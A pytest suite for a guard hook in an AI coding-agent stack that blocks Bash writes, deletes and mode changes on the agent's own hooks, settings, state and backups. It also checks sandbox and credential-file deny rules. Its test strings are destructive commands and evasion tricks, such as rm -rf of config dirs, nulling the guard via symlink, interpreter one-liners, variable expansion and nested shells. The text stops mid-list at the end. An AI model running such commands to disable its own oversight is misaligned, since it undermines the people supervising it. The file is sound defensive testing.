"""Tests for agent_guard.py's "protect" scan kind: a Bash-level write, delete, rename or mode
change (redirection, cp/mv/install/rsync, tee, dd, sed/perl -i, rm/unlink/rmdir, find -delete,
chmod/ln/touch/truncate, tar -x/unzip, inline python/node/perl code) is denied when it targets a
path already denied to the Read/Edit/Write tools (the stack's config dir: hooks/, bin/, agents/,
rules/, mcp/, magg/, skills/, CLAUDE.md, backup-*/, settings.json; the hook state dir; the
project's .git hooks/config and .claude settings). Claude Code's own protected-path check applies
to the Edit/Write tools, not to raw Bash, and bypassPermissions mode (a mode users may choose) skips
even that — this hook is the replacement, and it must not block ordinary Bash writes elsewhere.

Run: uv run --with pytest pytest -q tests/test_protected_paths.py
"""
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SRC_HOOK = ROOT / "dot-claude" / "hooks" / "agent_guard.py"
SRC_SETTINGS = ROOT / "dot-claude" / "settings.json"


@pytest.fixture
def installed(tmp_path, monkeypatch):
    """A rendered, installed-looking config dir (__CLAUDE_DIR__ substituted for real) plus a
    project directory with its own .claude/, so the deny rules the hook reads actually resolve to
    real paths instead of the literal template placeholder. The process runs in the project (as
    the hook does) and the hook state lives under tmp_path/state."""
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    cfg = tmp_path / "claude"
    (cfg / "hooks").mkdir(parents=True)
    shutil.copy(SRC_HOOK, cfg / "hooks" / "agent_guard.py")
    shutil.copy(SRC_HOOK.with_name("stack_io.py"), cfg / "hooks" / "stack_io.py")
    settings = SRC_SETTINGS.read_text().replace("__CLAUDE_DIR__", str(cfg))
    (cfg / "settings.json").write_text(settings)
    proj = tmp_path / "proj"
    (proj / ".claude" / "agents").mkdir(parents=True)
    (proj / ".git").mkdir()
    monkeypatch.chdir(proj)
    sys.path.insert(0, str(cfg / "hooks"))
    sys.modules.pop("agent_guard", None)
    import agent_guard as g
    yield g, cfg, proj
    sys.path.remove(str(cfg / "hooks"))
    sys.modules.pop("agent_guard", None)


def test_redirect_into_hooks_or_settings_or_bin_denied(installed):
    g, cfg, proj = installed
    ev = {"cwd": str(proj)}
    for target, op in [(cfg / "hooks" / "agent_guard.py", ">"), (cfg / "settings.json", ">>"),
                       (cfg / "bin" / "mcp-headers", ">")]:
        got = g.protected_write_in("echo x %s %s" % (op, target), ev)
        assert got and got[0] == "protect", target


def test_write_commands_denied(installed):
    g, cfg, proj = installed
    ev = {"cwd": str(proj)}
    target = str(cfg / "hooks" / "agent_guard.py")
    cases = [
        "cp new.py %s" % target,
        "mv new.py %s" % target,
        "sed -i s/x/y/ %s" % target,
        "sed -i.bak s/x/y/ %s" % target,
        "tee %s <<< x" % target,
        "dd if=/dev/zero of=%s" % target,
        "cp -t %s new.py" % (cfg / "hooks"),
        "install -m 0644 new.py %s" % target,
    ]
    for cmd in cases:
        got = g.protected_write_in(cmd, ev)
        assert got and got[0] == "protect", cmd


def test_nested_shells_still_caught(installed):
    g, cfg, proj = installed
    ev = {"cwd": str(proj)}
    target = str(cfg / "hooks" / "agent_guard.py")
    for cmd in ["bash -c 'echo x > %s'" % target, "eval \"echo x > %s\"" % target,
               "sh -c \"sed -i s/x/y/ %s\"" % target]:
        got = g.protected_write_in(cmd, ev)
        assert got and got[0] == "protect", cmd


def test_project_git_and_claude_settings_denied(installed):
    g, cfg, proj = installed
    ev = {"cwd": str(proj)}
    for cmd in ["echo x > .git/config", "echo x > .claude/settings.json",
               "echo x > .claude/settings.local.json", "echo x > .claude/hooks/x.py"]:
        got = g.protected_write_in(cmd, ev)
        assert got and got[0] == "protect", cmd


def test_ordinary_writes_allowed(installed):
    g, cfg, proj = installed
    ev = {"cwd": str(proj)}
    for cmd in ["echo x > /tmp/whatever.txt", "cp foo.txt bar.txt", "echo hi",
               "echo x > .claude/agents/coder.md", "sed -i s/x/y/ README.md",
               "cp a.py b.py", "tee out.log <<< x", "git commit -am 'x'",
               # C1 widened the scan to deletes, renames and inline code: ordinary ones still pass
               "rm -rf build/", "mv a b", "find . -name '*.pyc' -delete",
               "python3 -c \"import os; os.remove('x.tmp')\"", "touch .claude/agents/x.md",
               "rm .claude-work/x", "echo .claude-work/ >> .git/info/exclude",
               "cp %s/agents/coder.md /tmp/coder.md" % cfg, "cat %s/settings.json" % cfg,
               "python3 -c \"print(open('%s/settings.json').read())\"" % cfg]:
        got = g.protected_write_in(cmd, ev)
        assert got is None, (cmd, got)


C1_TARGETS = ["agents/coder.md", "rules/claude-agent-stack.md", "mcp/libdocs_mcp.py",
              "magg/config.json", "skills/x/SKILL.md", "CLAUDE.md",
              "backup-20260101-000000-abc/settings.json", "stack.env", ".stack-manifest.json"]


@pytest.mark.parametrize("rel", C1_TARGETS)
def test_c1_config_dirs_protected(installed, rel):
    g, cfg, proj = installed
    got = g.protected_write_in("echo x > %s/%s" % (cfg, rel), {"cwd": str(proj)})
    assert got and got[0] == "protect", rel


def c1_deletes(cfg):
    return [
        "rm -rf {c}/agents", "rm {c}/CLAUDE.md", "unlink {c}/settings.json", "rmdir {c}/rules",
        "mv {c}/agents /tmp/x", "mv {c}/skills/a {c}/skills/b", "find {c}/skills -delete",
        "find {c} -name '*.md' -exec rm {{}} \\;", "chmod 000 {c}/hooks/agent_guard.py",
        "ln -sf /dev/null {c}/hooks/agent_guard.py", "truncate -s0 {c}/settings.json",
        "touch {c}/agents/new.md", "cd {c} && rm -rf agents", "cd {c}/agents; rm coder.md",
        "echo {c}/agents/a.md | xargs rm -f", "tar -xf a.tar -C {c}",
        "unzip -o a.zip -d {c}/skills",
        "python3 -c \"import os; os.remove('{c}/settings.json')\"",
        "python3 -c \"import shutil; shutil.rmtree('{c}/hooks')\"",
        "perl -e 'unlink \"{c}/CLAUDE.md\"'",
        "node -e \"require('fs').rmSync('{c}/agents',{{recursive:true}})\"",
        "python3 - <<'EOF'\nimport os\nos.remove('{c}/settings.json')\nEOF",
        "bash -c 'rm -rf {c}/skills'",
        # review of Part A: interpreters outside the first trigger list, and their write idioms
        "julia -e 'rm(\"{c}/settings.json\")'",
        "julia -e 'write(\"{c}/hooks/agent_guard.py\", \"x\")'",
        "lua -e 'os.remove(\"{c}/settings.json\")'",
        "luajit -e 'io.output(\"{c}/settings.json\")'",
        "Rscript -e 'file.remove(\"{c}/settings.json\")'",
        "Rscript -e 'cat(1, file=\"{c}/settings.json\")'",
        "Rscript -e 'write.csv(x, \"{c}/agents/a.md\")'",
        "Rscript -e 'writeLines(\"x\", \"{c}/rules/r.md\")'",
        "php -r 'file_put_contents(\"{c}/settings.json\", \"x\");'",
        "php -r '$f = fopen(\"{c}/settings.json\", \"w\");'",
        # review of Part B: the plain R interpreter
        "R -e 'file.remove(\"{c}/settings.json\")'",
        "R --slave -e 'file.copy(\"x\", \"{c}/settings.json\", overwrite=TRUE)'",
    ]


def test_c1_deletes_renames_and_mode_changes_denied(installed):
    g, cfg, proj = installed
    for tmpl in c1_deletes(cfg):
        cmd = tmpl.format(c=cfg)
        got = g.protected_write_in(cmd, {"cwd": str(proj)})
        assert got and got[0] == "protect", cmd


def test_c1_reading_config_in_code_is_not_a_write(installed):
    """Method calls named write (sys.stdout.write, process.stdout.write), fopen in read mode and
    Julia's write to stdout read the config dir: not protected writes."""
    g, cfg, proj = installed
    for tmpl in [
        "python3 -c 'import sys; sys.stdout.write(open(\"{c}/settings.json\").read())'",
        "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"{c}/settings.json\", \"utf8\"))'",
        "php -r '$f = fopen(\"{c}/settings.json\", \"r\"); echo fread($f, 100);'",
        "julia -e 'write(stdout, read(\"{c}/settings.json\"))'",
    ]:
        cmd = tmpl.format(c=cfg)
        assert g.protected_write_in(cmd, {"cwd": str(proj)}) is None, cmd


def test_c1_hook_state_dir_protected(installed, tmp_path):
    g, cfg, proj = installed
    st = tmp_path / "state" / "claude-agent-stack"
    assert g.state_root() == str(st)
    for cmd in ["rm -rf %s/s1/blackcat" % st, "echo x > %s/s1/screen.lock" % st, "rm -rf %s" % st,
                "mv %s/s1 /tmp/y" % st, "find %s -delete" % st.parent]:
        got = g.protected_write_in(cmd, {"cwd": str(proj)})
        assert got and got[0] == "protect", cmd


def test_installer_backups_protected(installed, tmp_path):
    """install.sh keeps its backups beside the state dir (the guard prunes idle state folders);
    agents can neither change them through Bash nor read them through the tools or the sandbox."""
    g, cfg, proj = installed
    bk = tmp_path / "state" / "claude-agent-stack-backups"
    assert g.backup_root() == str(bk)
    for cmd in ["rm -rf %s" % bk, "echo x > %s/20260101-000000-abc/files/settings.json" % bk,
                "mv %s/20260101-000000-abc /tmp/y" % bk, "chmod -R 777 %s" % bk]:
        got = g.protected_write_in(cmd, {"cwd": str(proj)})
        assert got and got[0] == "protect", cmd
    s = json.loads((ROOT / "dot-claude" / "settings.json").read_text())
    assert {"Read(/__STACK_BACKUPS__/**)", "Edit(/__STACK_BACKUPS__/**)"} <= set(s["permissions"]["deny"])
    fs = s["sandbox"]["filesystem"]
    assert "__STACK_BACKUPS__" in fs["denyRead"] and "__STACK_BACKUPS__" in fs["denyWrite"]


def run_hook(installed_hook_path, command, **env):
    ev = {"session_id": "t", "hook_event_name": "PreToolUse", "tool_name": "Bash",
          "tool_input": {"command": command}, "cwd": env.pop("cwd", None)}
    return subprocess.run([sys.executable, str(installed_hook_path), "no-push"],
                          input=json.dumps(ev), capture_output=True, text=True, timeout=30,
                          env=dict(os.environ, **env))


def test_hook_denies_protected_write_end_to_end(installed):
    g, cfg, proj = installed
    hook_path = cfg / "hooks" / "agent_guard.py"
    target = str(cfg / "settings.json")
    p = run_hook(hook_path, "echo x > %s" % target, cwd=str(proj), STACK_POLICY="off")
    assert p.returncode == 0, p.stderr
    out = json.loads(p.stdout)["hookSpecificOutput"]
    assert out["permissionDecision"] == "deny"
    assert "protected-path rule" in out["permissionDecisionReason"]


def test_hook_allows_ordinary_write_end_to_end(installed):
    g, cfg, proj = installed
    hook_path = cfg / "hooks" / "agent_guard.py"
    p = run_hook(hook_path, "echo x > /tmp/whatever.txt", cwd=str(proj))
    assert p.returncode == 0 and p.stdout == "", p.stderr


def test_settings_wire_ask_rules_and_protected_paths():
    s = json.loads(SRC_SETTINGS.read_text())
    ask = set(s["permissions"].get("ask") or [])
    # P3: scheduling and routines prompt even in bypassPermissions (explicit ask rules do)
    assert {"mcp__magg__magg_add_server", "mcp__magg__magg_load_kit",
            "mcp__magg__proxy", "CronCreate", "RemoteTrigger"} <= ask
    deny = set(s["permissions"]["deny"])
    assert {"Edit(.git/hooks/**)", "Edit(.git/config)", "Edit(.claude/settings.json)",
            "Edit(.claude/settings.local.json)", "Edit(.claude/hooks/**)"} <= deny
    # a whole-.git deny would become a sandbox denyWrite on the project's .git and break commits
    assert "Edit(.git/**)" not in deny
    # agents/, skills/ etc. in a project's .claude/ stay editable: only the settings/hooks are
    # locked down, matching the global config's own scope
    assert "Edit(.claude/**)" not in deny
    # C1: the stack's own config is denied to Edit/Write
    for rel in ("hooks/**", "bin/**", "settings.json", "agents/**", "rules/**", "mcp/**",
                "magg/**", "skills/**", "CLAUDE.md", "backup-*/**", "stack-plugins/**", "plugins/**"):
        assert "Edit(/__CLAUDE_DIR__/%s)" % rel in deny, rel
    # R3-STATE: the guard's state dir as the installer renders it ($XDG_STATE_HOME/...), like the
    # backups and the cache; never a fixed ~/.local/state the guard may not be using
    assert "Edit(/__STACK_STATE__/**)" in deny
    assert not [r for r in deny if ".local/state" in r], deny
    # C4/C8: secrets and backups are Read-denied (a Read deny also blocks Edit/Write)
    for r in ("Read(/__CLAUDE_DIR__/**/stack.env)", "Read(/__CLAUDE_DIR__/backup-*/**)",
              "Read(~/.git-credentials)", "Read(~/.config/git/credentials)", "Read(~/.npmrc)",
              "Read(~/.pypirc)",
              "Read(~/.docker/config.json)", "Read(~/.kube/**)", "Read(~/.gnupg/**)",
              "Read(~/.config/gcloud/**)", "Read(~/.ssh/**)", "Read(~/.aws/**)",
              "Read(~/.netrc)", "Read(~/.config/gh/hosts.yml)"):
        assert r in deny, r


def test_settings_sandbox_block():
    s = json.loads(SRC_SETTINGS.read_text())
    sb = s["sandbox"]
    assert sb["enabled"] is True and sb["allowUnsandboxedCommands"] is False
    fs = sb["filesystem"]
    # sandbox paths: `/` absolute (the installer renders __CLAUDE_DIR__ absolute), `~/` home
    assert "__CLAUDE_DIR__" in fs["denyWrite"]
    assert "__STACK_STATE__" in fs["denyWrite"]
    assert not [p for lst in fs.values() if isinstance(lst, list) for p in lst
                if ".local/state" in p]
    assert {"__CLAUDE_DIR__/**/stack.env", "__CLAUDE_DIR__/backup-*"} <= set(fs["denyRead"])
    assert fs["allowWrite"] == ["~/.cache/claude-sandbox"]  # the sandbox's own caches only
    for lst in ("allowWrite", "denyWrite", "denyRead"):
        assert len(fs[lst]) == len(set(fs[lst])), lst
        for p in fs[lst]:
            assert p.startswith(("~/", "__CLAUDE_DIR__", "__STACK_BACKUPS__", "__STACK_CACHE__",
                                 "__STACK_STATE__")), p
    net = sb["network"]
    assert net["strictAllowlist"] is True
    doms = net["allowedDomains"]
    assert len(doms) == len(set(doms))
    assert {"pypi.org", "files.pythonhosted.org", "registry.npmjs.org", "github.com",
            "huggingface.co", "crates.io", "proxy.golang.org"} <= set(doms)
    known = {"enabled", "failIfUnavailable", "autoAllowBashIfSandboxed", "excludedCommands",
             "allowUnsandboxedCommands", "enableWeakerNestedSandbox",
             "enableWeakerNetworkIsolation", "allowAppleEvents", "ignoreViolations", "ripgrep",
             "filesystem", "network", "credentials"}
    assert set(sb) <= known
    assert set(fs) <= {"allowWrite", "denyWrite", "denyRead", "allowRead", "disabled"}
    # C6: forge tokens never reach a sandboxed command
    env_deny = {e["name"] for e in sb["credentials"]["envVars"] if e["mode"] == "deny"}
    assert {"GITHUB_TOKEN", "GH_TOKEN", "GITLAB_TOKEN"} <= env_deny
    assert set(net) <= {"allowedDomains", "deniedDomains", "strictAllowlist", "allowLocalBinding",
                        "allowUnixSockets", "allowAllUnixSockets", "allowMachLookup",
                        "httpProxyPort", "socksProxyPort", "tlsTerminate"}


def _sandbox_glob(pattern):
    """A sandbox path pattern as a regex: `**/` any number of directories, `*` within one name."""
    out, i = "", 0
    while i < len(pattern):
        if pattern.startswith("**/", i):
            out, i = out + "(?:[^/]+/)*", i + 3
        elif pattern[i] == "*":
            out, i = out + "[^/]*", i + 1
        else:
            out, i = out + re.escape(pattern[i]), i + 1
    return re.compile(out + r"\Z")


def test_state_locks_unreadable_in_the_sandbox():
    """S2: a flock needs only a read-only fd, so a sandboxed command that can open the state dir's lock
    or mutex files could hold them and stall the collector (runs3.lock), the limits commands and
    SessionStart's apply (limits.lock), the read gate or the guard (*.mutex). They are denyRead."""
    fs = json.loads(SRC_SETTINGS.read_text())["sandbox"]["filesystem"]
    pats = [_sandbox_glob(p) for p in fs["denyRead"]]
    for path in ("limits/limits.lock", "limits/proposals.lock", "usage/runs2.lock", "usage/runs3.lock", "usage/refresh.lock",
                 "usage/sessions/abc-1/collector.lock", "abc-1/read-gate.json.lock", "abc-1/registry.mutex",
                 "abc-1/screen.mutex"):
        assert any(p.match("__STACK_STATE__/" + path) for p in pats), path
    for path in ("limits/live.json", "usage/runs2.csv", "usage/runs3.csv", "abc-1/budget.json"):    # readable as before
        assert not any(p.match("__STACK_STATE__/" + path) for p in pats), path
    assert {"__STACK_STATE__/**/*.lock", "__STACK_STATE__/**/*.mutex"} <= set(fs["denyRead"])


def test_settings_round2_hardening():
    """N1, N2, N3, N4, C2-residual (security-findings-round2.md)."""
    s = json.loads(SRC_SETTINGS.read_text())
    sb, fs, env = s["sandbox"], s["sandbox"]["filesystem"], s["env"]
    perms = s["permissions"]
    # N2: no silent fallback to unsandboxed commands
    assert sb["failIfUnavailable"] is True
    # N4, R3-CACHES: nothing an unsandboxed process loads code from is sandbox-writable
    for gone in ("~/.local/share/uv", "~/.npm", "~/.rustup", "~/.julia", "~/.elan", "~/.cache",
                 "~/Library/Caches", "~/.cargo/registry", "~/.cargo/git", "~/go/pkg",
                 "~/.gradle/caches", "~/.m2/repository", "~/.bun/install/cache", "~/.matplotlib"):
        assert gone not in fs["allowWrite"], gone
    assert {"__STACK_CACHE__", "~/.cache/uv", "~/.cache/pre-commit", "~/.cache/ms-playwright",
            "~/Library/Caches/ms-playwright", "~/Library/Caches/Coursier"} <= set(fs["denyWrite"])
    # R3-CACHES, R3-GITENV: cache locations and the git credential reset are Bash-only (the
    # session-env SessionStart hook), never settings env, which reaches unsandboxed processes
    for key in ("UV_CACHE_DIR", "npm_config_cache", "PRE_COMMIT_HOME", "XDG_CACHE_HOME",
                "CARGO_HOME", "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0",
                "GIT_CONFIG_PARAMETERS", "HF_HOME", "MAVEN_OPTS"):
        assert key not in env, key
    groups = [g for g in s["hooks"]["SessionStart"]
              if any(h.get("command", "").endswith('stack-hook" agent_guard session-env')
                     for h in g["hooks"])]
    assert len(groups) == 1 and "matcher" not in groups[0]      # every source: clear included
    # N1: gh's and git's stores unreadable
    assert {"~/.config/gh/hosts.yml", "~/.git-credentials"} <= set(fs["denyRead"])
    assert {"Read(~/.config/gh/hosts.yml)", "Read(~/.git-credentials)"} <= set(perms["deny"])
    # N3: enabling a catalog server and the duckdb/jupyter tools ask (ask rules prompt even in
    # bypassPermissions: permission-modes#actions-no-mode-auto-approves)
    # ros (publishes to a robot) and qiskit (submits hardware jobs) ask at every call too
    for t in ("mcp__magg__magg_enable_server", "mcp__magg__duckdb_*", "mcp__magg__jupyter_*",
              "mcp__magg__ros_*", "mcp__magg__qiskit_*", "mcp__magg__docspace_*"):
        assert t in perms["ask"] and t not in perms["allow"], t
    # C2-residual: model and notebook tokens never reach a sandboxed command
    env_deny = {e["name"] for e in sb["credentials"]["envVars"] if e["mode"] == "deny"}
    assert {"HF_TOKEN", "WANDB_API_KEY", "JUPYTER_TOKEN"} <= env_deny


def test_magg_duckdb_read_only():
    m = json.loads((SRC_SETTINGS.parent / "magg" / "config.json").read_text())
    args = m["servers"]["duckdb"]["args"]
    assert "--read-write" not in args and "--allow-switch-databases" not in args
    init = args[args.index("--init-sql") + 1]
    assert "lock_configuration=true" in init and "autoload_known_extensions=false" in init


def test_settings_wire_blackcat_guard_and_memory_hooks():
    s = json.loads(SRC_SETTINGS.read_text())
    pre = s["hooks"]["PreToolUse"]
    cmds = [(g["matcher"], h["command"]) for g in pre for h in g["hooks"]]
    assert [m for m, c in cmds if c.endswith("blackcat-guard --settings")] == ["*"]
    assert any(m == "mcp__neural-memory__nmem_remember" and c.endswith('--fail-closed agent_guard')
               for m, c in cmds)
    assert len(cmds) == len(set(cmds))


# --- shell expansion, globs, cd and git work trees (F1 and F4 of the stack-tighten probe) -----

ENTRIES = ["agents/x.md", "skills/x/SKILL.md", "rules/x.md", "mcp/x.py", "magg/config.json",
           "hooks/agent_guard.py", "bin/mcp-headers", "settings.json", "CLAUDE.md",
           "stack-plugins/x", "stack.env", ".stack-manifest.json", "backup-old/stack.env"]
WRITES = ["rm {p}", "echo x > {p}", "echo x >> {p}", "mv /tmp/new {p}", "cp /tmp/a {p}",
          "sed -i.bak s/a/b/ {p}", "echo x | tee {p}", "touch {p}"]
# each form names the config dir; {e} is the entry below it
CONFIG_FORMS = ["$HOME/.claude/{e}", "${{HOME}}/.claude/{e}", '"$HOME/.claude/{e}"',
                '"$HOME"/.claude/{e}', "$CLAUDE_CONFIG_DIR/{e}", "${{CLAUDE_CONFIG_DIR}}/{e}",
                '"$CLAUDE_CONFIG_DIR"/{e}', "${{CLAUDE_CONFIG_DIR:-$HOME/.claude}}/{e}",
                "${{HOME:-/nonexistent}}/.claude/{e}", "~/.claude/{e}",
                '"$D"/.claude/{e}', "$(pwd)/.claude/{e}", "`pwd`/.claude/{e}"]


@pytest.fixture
def shell_env(installed, tmp_path, monkeypatch):
    """HOME whose .claude is the installed config dir (a symlink, as with dotfiles); no
    CLAUDE_CONFIG_DIR unless a test sets it. XDG_STATE_HOME comes from `installed`."""
    g, cfg, proj = installed
    home = tmp_path / "home"
    home.mkdir()
    (home / ".claude").symlink_to(cfg)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
    return g, cfg, proj, home


def denied(g, proj, cmd):
    got = g.protected_write_in(cmd, {"cwd": str(proj)})
    return bool(got and got[0] == "protect")


@pytest.mark.parametrize("form", CONFIG_FORMS)
@pytest.mark.parametrize("entry", ENTRIES)
def test_f1_expansions_of_the_config_dir_denied(shell_env, monkeypatch, entry, form):
    g, cfg, proj, home = shell_env
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(cfg))
    path = form.format(e=entry)
    for tmpl in WRITES:
        cmd = tmpl.format(p=path)
        assert denied(g, proj, cmd), cmd


def test_f1_config_dir_default_when_env_unset(shell_env):
    g, cfg, proj, home = shell_env                    # CLAUDE_CONFIG_DIR unset: ~/.claude
    for cmd in ["rm $CLAUDE_CONFIG_DIR/agents/x.md", "rm ${CLAUDE_CONFIG_DIR}/rules/x.md",
                "rm ${CLAUDE_CONFIG_DIR:-$HOME/.claude}/agents/x.md",
                "rm ${CLAUDE_CONFIG_DIR:-~/.claude}/agents/x.md"]:
        assert denied(g, proj, cmd), cmd


def test_f1_default_word_only_when_the_variable_is_unset(shell_env, monkeypatch, tmp_path):
    g, cfg, proj, home = shell_env
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(tmp_path / "elsewhere"))
    assert not denied(g, proj, "rm ${CLAUDE_CONFIG_DIR:-$HOME/.claude}/agents/x.md")
    monkeypatch.delenv("CLAUDE_CONFIG_DIR")
    assert denied(g, proj, "rm ${CLAUDE_CONFIG_DIR:-$HOME/.claude}/agents/x.md")


STATE_FORMS = ["$XDG_STATE_HOME/claude-agent-stack/{e}",
               "${{XDG_STATE_HOME}}/claude-agent-stack/{e}",
               '"$XDG_STATE_HOME"/claude-agent-stack/{e}',
               "${{XDG_STATE_HOME:-$HOME/.local/state}}/claude-agent-stack/{e}",
               "$XDG_STATE_HOME/claude-agent-stack-backups/{e}",
               "$HOME/.local/state/claude-agent-stack/{e}", "$X/.local/state/claude-agent-stack/{e}"]


@pytest.mark.parametrize("form", STATE_FORMS)
def test_f1_state_and_backup_dirs_via_variables(shell_env, form):
    g, cfg, proj, home = shell_env                    # XDG_STATE_HOME is set by `installed`
    for tmpl in ["rm -rf {p}", "echo x > {p}", "mv {p} /tmp/y"]:
        cmd = tmpl.format(p=form.format(e="s1/screen.lock"))
        if "$HOME/.local/state" in form and "XDG_STATE_HOME" not in form:
            continue                                  # HOME default: see the next test
        assert denied(g, proj, cmd), cmd


def test_f1_state_dir_default_under_home(shell_env, monkeypatch):
    g, cfg, proj, home = shell_env
    monkeypatch.delenv("XDG_STATE_HOME")
    for cmd in ["rm -rf $HOME/.local/state/claude-agent-stack/s1",
                "rm -rf $XDG_STATE_HOME/claude-agent-stack",
                "rm -rf ${XDG_STATE_HOME:-$HOME/.local/state}/claude-agent-stack/s1",
                "rm -rf ${XDG_STATE_HOME:-$HOME/.local/state}/claude-agent-stack-backups"]:
        assert denied(g, proj, cmd), cmd


def test_f1_pwd_is_the_base(shell_env):
    g, cfg, proj, home = shell_env
    assert not denied(g, proj, "rm $PWD/build/x")
    assert denied(g, proj, "rm $PWD/.git/hooks/pre-commit")
    assert denied(g, proj, "rm ${PWD}/.git/config")
    assert denied(g, proj, "cd %s && rm $PWD/agents/x.md" % cfg)


@pytest.mark.parametrize("cmd", [
    "C=$HOME/.claude; rm $C/agents/x.md",
    "export C=~/.claude && rm -rf \"$C\"/skills",
    "C=${HOME}/.claude && rm ${C}/rules/x.md",
    "declare -x C=$HOME/.claude; echo x > $C/settings.json",
    "A=$HOME; B=$A/.claude; rm $B/agents/x.md",
    "D=$HOME/.claude/agents; rm $D/x.md",
    "C=$HOME/.claude env rm $C/agents/x.md",
    "bash -c 'C=~/.claude; rm $C/agents/x.md'",
])
def test_f1_variables_assigned_earlier_in_the_command(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert denied(g, proj, cmd), cmd


@pytest.mark.parametrize("cmd", [
    "rm -rf \"$D/.claude\"", "mv $X/a/.claude/settings.json /tmp/s",
    "rm -rf $STATE/.local/state/claude-agent-stack",
    "rm -rf $(git rev-parse --show-toplevel)/.claude", "rm $X/.claude/agents/x.md",
    "rm -rf \"$D/.claude/hooks\"", "cd \"$X/.claude\" && rm settings.json",
    # a bare protected name after an expansion that may hold a protected root
    "D=$(echo ~/.claude); rm -rf $D/hooks", "D=~/.claude; E=$D; rm -rf $E/hooks",
    "for d in ~/.claude; do rm -rf \"$d/hooks\"; done",
    "for d in ~/.claude x; do rm -rf \"$d/hooks\"; done", "set -- ~/.claude; rm -rf $1/hooks",
    "bash -c 'rm -rf $1/hooks' _ ~/.claude", "rm -rf $(echo ~/.claude)/hooks",
    "rm -rf `echo $HOME/.claude`/hooks", "rm -rf $(dirname $CLAUDE_CONFIG_DIR/x)/hooks",
    "D=$CLAUDE_CONFIG_DIR/x; rm -rf $D/../hooks",
])
def test_f1_opaque_start_naming_a_protected_entry(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert denied(g, proj, cmd), cmd


@pytest.mark.parametrize("cmd", [
    "rm -rf $TMPDIR/build", 'rm -rf "$out"', "rm $X/foo.txt", "rm -rf $OUT/dist/x",
    "echo x > $LOG", "cp a.txt $DEST/", "mv $SRC/a $DST/b", 'rm -rf "$BUILD_DIR/cache"',
    "rm -rf $(mktemp -d)/x", "rm $TMPDIR/agents-list.txt", "touch $X/claude/x",
    "rm ${X}/mcp-notes.txt", "cd $TMPDIR && rm x", 'cd "$proj" && ls',
    "R=$(mktemp -d); rm -rf $R/build",
    # an unresolved expansion then a bare protected name: ordinary project paths
    'rm -rf "$VENV/bin"', 'install -m755 tool "$DESTDIR/bin/tool"', 'cp out "$PREFIX/bin/"',
    'chmod +x "$OUT/bin/run.sh"', 'mv x.json "$target/settings.json"',
    'for d in a b; do rm -rf "$d/bin"; done', "rm -rf $(mktemp -d)/hooks",
    'cd "$VENV/bin" && rm x', "rm $X/agents/x.md", "echo x > $D/hooks/a.py", "rm ${X}/skills",
    "cp /tmp/a $X/mcp/a.py", "rm ${X%/}/agents/x.md", "rm $A$B/stack.env",
    "rm -rf $ROOT/backup-2026", "rm `dirname $0`/rules/x.md", "R=$(mktemp -d); rm $R/agents/x.md",
    "for d in a b; do rm -rf \"$d/hooks\"; done; echo .claude-work",
])
def test_f1_ordinary_unresolved_variables_allowed(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert not denied(g, proj, cmd), cmd


@pytest.mark.parametrize("cmd", [
    "rm -rf ~/.claude/*", "rm -rf $HOME/.claude/*", 'rm -rf "$HOME/.claude"/*',
    "rm ~/.claude/agents/*.md", "rm ~/.claude/agents/scout*", "rm ~/.claude/agents/?.md",
    "rm ~/.claude/agents/[a-c]*", "rm -rf ~/.local/state/claude-agent-stack/*",
    "rm ~/.local/state/claude-agent-stack/*/screen.lock", "rm ~/.claude/ag*",
    "rm -rf ~/.claude/backup-2*", "rm ~/.claude/*", "mv ~/.claude/agents/* /tmp/x",
    "cp /tmp/a.md ~/.claude/agents/*", "rm ~/.claude/s*", "rm -rf ~/.claude/$X",
    "echo x > ~/.claude/agents/*", "chmod 000 ~/.claude/skills/*/SKILL.md",
    "rm -rf ~/.local/state/claude-agent-stack-backups/*", "rm -rf ~/.claude/hooks/*.py",
])
def test_f1_globs_over_protected_directories_denied(shell_env, monkeypatch, cmd):
    g, cfg, proj, home = shell_env
    monkeypatch.setenv("XDG_STATE_HOME", str(home / ".local" / "state"))
    assert denied(g, proj, cmd), cmd


@pytest.mark.parametrize("cmd", [
    "rm -rf /tmp/x/*", "rm ~/.claude/projects/*/foo", "rm build/*", "rm -rf build/*", "rm *",
    "rm ./*.pyc", "rm -rf dist/*.whl", "rm ~/.claude/*.log", "rm ~/.claude/projects/*",
    "rm ~/.claude/.??*.tmp", "rm -f /tmp/x?.txt", "rm src/**/*.pyc", "mv build/* /tmp/old/",
    "cp /tmp/a/* build/", "rm -rf ~/.cache/pip/*", "rm ~/Downloads/*.zip",
])
def test_f1_ordinary_globs_allowed(shell_env, cmd):
    g, cfg, proj, home = shell_env
    assert not denied(g, proj, cmd), cmd


@pytest.mark.parametrize("cmd", [
    "cd $HOME/.claude && rm agents/x.md",
    'cd "${HOME}/.claude/hooks" && echo x > agent_guard.py',
    "pushd $HOME/.claude && rm agents/x.md",
    "pushd ~/.claude >/dev/null; rm rules/x.md",
    "builtin cd $HOME/.claude && rm agents/x.md",
    "command cd $HOME/.claude && rm agents/x.md",
    "cd $CLAUDE_CONFIG_DIR && rm agents/x.md",
    "cd ${CLAUDE_CONFIG_DIR:-$HOME/.claude}/agents && rm x.md",
    "cd $HOME/.claude/agents && rm *.md",
    "cd $HOME && cd .claude && rm agents/x.md",
    "cd $HOME/.claude/$X && rm agents/x.md",
    "cd $D/.claude && rm agents/x.md",
    'cd "$D/.claude" && echo x > settings.json',
    "C=$HOME/.claude; cd $C && rm agents/x.md",
])
def test_f1_cd_then_relative_write(shell_env, monkeypatch, cmd):
    g, cfg, proj, home = shell_env
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(cfg))
    assert denied(g, proj, cmd), cmd


@pytest.mark.parametrize("cmd", [
    "cd $HOME && rm build/x", "cd $HOME/projects && rm agents/x.md", "cd $TMPDIR && rm agents/x",
    "cd $HOME/.claude && ls agents", "cd ~/.claude && cat settings.json",
    'cd "$D/.claude" && ls', "cd $REPO/.claude && cat settings.json",
